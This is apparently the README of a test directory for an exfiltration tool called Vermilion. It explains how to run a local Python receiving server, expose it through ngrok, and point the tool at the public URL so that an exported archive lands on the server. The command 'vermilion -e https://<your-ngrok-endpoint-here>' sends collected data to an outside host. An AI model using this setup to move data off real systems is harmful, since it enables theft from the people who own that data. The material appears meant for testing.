# Test Exfiltration Locally

This directory contains a simple http server writte in python to test exfiltration locally.  

I suggest using also [*ngrok*](https://ngrok.com/), [*Cloudflare Tunnels*](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/) or similar, to expose the exfiltration endpoint publicly for the tests.  

## Instructions  

Launch the python endpoint:  
```console
python3 endpoint.py
```  
Expose the endpoint server publicly via `ngrok`:  
```console
ngrok http 8089
```  

Launch Vermilion:  
```console
vermilion -e https://<your-ngrok-endpoint-here>
```  

If everything went well you should see the exported archive in the current directory!  




